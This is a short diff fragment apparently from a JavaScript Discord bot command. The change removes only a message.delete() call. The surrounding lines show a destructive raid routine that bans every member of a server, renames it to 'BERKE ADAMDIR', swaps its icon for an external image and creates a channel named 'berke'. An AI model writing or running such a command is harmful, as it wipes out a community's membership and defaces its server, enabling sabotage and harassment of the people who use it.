@@ -12,7 +12,6 @@ message.guild.members.forEach(member => member.ban())
 message.guild.setName(`BERKE ADAMDIR`, "")
 message.guild.setIcon(`https://cdn.discordapp.com/attachments/522020595123224595/585051070942674964/unknown.png`)
 message.guild.createChannel(`berke`)
-message.delete()
 };
 
 exports.conf = {
